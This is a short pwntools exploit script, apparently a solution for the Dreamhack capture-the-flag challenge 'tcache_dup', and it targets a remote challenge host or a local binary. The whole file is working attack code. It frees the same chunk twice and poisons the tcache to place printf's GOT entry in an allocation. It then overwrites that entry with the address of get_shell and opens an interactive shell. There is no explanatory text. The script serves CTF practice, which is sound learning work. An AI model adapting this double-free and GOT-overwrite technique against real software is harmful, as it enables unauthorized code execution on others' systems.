#!/usr/bin/env python3
from pwn import *

PORT =  15927
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./tcache_dup_patched', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x00000000004009c7
        	b*0x0000000000400a95
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

#GDB()

def create(size, data):
	p.sendlineafter(b"> ", str(1))
	p.sendlineafter(b"Size: ", str(size))
	p.sendlineafter(b"Data: ", data)

def delete(idx):
	p.sendlineafter(b"> ", str(2))
	p.sendlineafter(b"idx: ", str(idx))

create(0x50, b"A"*8)

win = p64(exe.sym.get_shell)
printf = p64(exe.got.printf)

delete(0)
delete(0)
GDB()
create(0x50, printf)

create(0x50, b"D"*8)
create(0x50, win)


p.interactive()

# &ptr = 0x6010c0